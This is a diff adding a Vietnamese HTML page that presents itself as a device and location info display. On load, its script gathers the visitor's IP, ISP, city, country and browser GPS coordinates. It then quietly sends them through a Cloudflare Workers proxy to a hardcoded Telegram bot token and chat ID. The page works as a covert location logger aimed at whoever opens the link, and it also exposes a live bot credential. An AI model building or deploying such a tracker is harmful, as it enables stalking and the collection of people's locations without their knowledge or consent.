@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Thông tin thiết bị & vị trí</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      background-color: #0f0f0f;
+      color: #fff;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h1 { color: #00ffff; }
+    .info {
+      margin: 6px 0;
+      padding: 6px 12px;
+      background: #1e1e2e;
+      border-left: 4px solid #00ffff;
+      border-radius: 4px;
+    }
+    .label { color: #aaa; }
+    .value { color: #0ff; }
+  </style>
+</head>
+<body>
+  <h1>Thông tin thiết bị & vị trí</h1>
+  <div class="info"><span class="label">🕒 Thời gian:</span> <span class="value" id="time"></span></div>
+  <div class="info"><span class="label">🌐 IP:</span> <span class="value" id="ip"></span></div>
+  <div class="info"><span class="label">🏢 ISP:</span> <span class="value" id="isp"></span></div>
+  <div class="info"><span class="label">🏙️ Địa chỉ:</span> <span class="value" id="address"></span></div>
+  <div class="info"><span class="label">🌍 Quốc gia:</span> <span class="value" id="country"></span></div>
+  <div class="info"><span class="label">🧭 Kinh độ (IP):</span> <span class="value" id="lon"></span></div>
+  <div class="info"><span class="label">🧭 Vĩ độ (IP):</span> <span class="value" id="lat"></span></div>
+  <div class="info"><span class="label">📍 Kinh độ (GPS):</span> <span class="value" id="gpsLon"></span></div>
+  <div class="info"><span class="label">📍 Vĩ độ (GPS):</span> <span class="value" id="gpsLat"></span></div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo'; // ← Thay tại đây
+    const TELEGRAM_CHAT_ID = '-1002380729123';     // ← Thay tại đây
+
+    const API_BASE = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    let info = {
+      time: new Date().toLocaleString(),
+      ip: "Đang tải...",
+      isp: "",
+      address: "",
+      country: "",
+      lat: "",
+      lon: "",
+      gpsLat: "",
+      gpsLon: ""
+    };
+
+    let gpsLoaded = false;
+    let ipLoaded = false;
+    let sent = false;
+
+    document.getElementById("time").textContent = info.time;
+
+    fetch("https://ipwho.is/")
+      .then(res => res.json())
+      .then(data => {
+        info.ip = data.ip;
+        info.isp = data.connection?.org || 'Không rõ';
+        info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
+        info.country = data.country;
+        info.lat = data.latitude;
+        info.lon = data.longitude;
+
+        document.getElementById("ip").textContent = info.ip;
+        document.getElementById("isp").textContent = info.isp;
+        document.getElementById("address").textContent = info.address;
+        document.getElementById("country").textContent = info.country;
+        document.getElementById("lat").textContent = info.lat;
+        document.getElementById("lon").textContent = info.lon;
+
+        ipLoaded = true;
+        sendIfReady();
+      });
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          info.gpsLat = pos.coords.latitude;
+          info.gpsLon = pos.coords.longitude;
+          gpsLoaded = true;
+          document.getElementById("gpsLat").textContent = info.gpsLat;
+          document.getElementById("gpsLon").textContent = info.gpsLon;
+          sendIfReady();
+        },
+        () => {
+          gpsLoaded = true;
+          info.gpsLat = "Từ chối";
+          info.gpsLon = "Từ chối";
+          document.getElementById("gpsLat").textContent = "Từ chối";
+          document.getElementById("gpsLon").textContent = "Từ chối";
+          sendIfReady();
+        }
+      );
+    } else {
+      gpsLoaded = true;
+      info.gpsLat = "Không hỗ trợ";
+      info.gpsLon = "Không hỗ trợ";
+      sendIfReady();
+    }
+
+    function sendIfReady() {
+      if (ipLoaded && gpsLoaded && !sent) {
+        sent = true;
+
+        const message = `
+📡 [THÔNG TIN TRUY CẬP]
+
+🕒-Thời gian: ${info.time}
+🌐-IP: ${info.ip}
+🏙️-Địa chỉ: ${info.address}
+🌍-Quốc gia: ${info.country}
+📍-Vĩ độ (IP): ${info.lat}
+📍-Kinh độ (IP): ${info.lon}
+📍-Vĩ độ (GPS): ${info.gpsLat}
+📍-Kinh độ (GPS): ${info.gpsLon}
+        `.trim();
+
+        fetch(API_BASE, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+          })
+        });
+      }
+    }
+  </script>
+</body>
+</html>
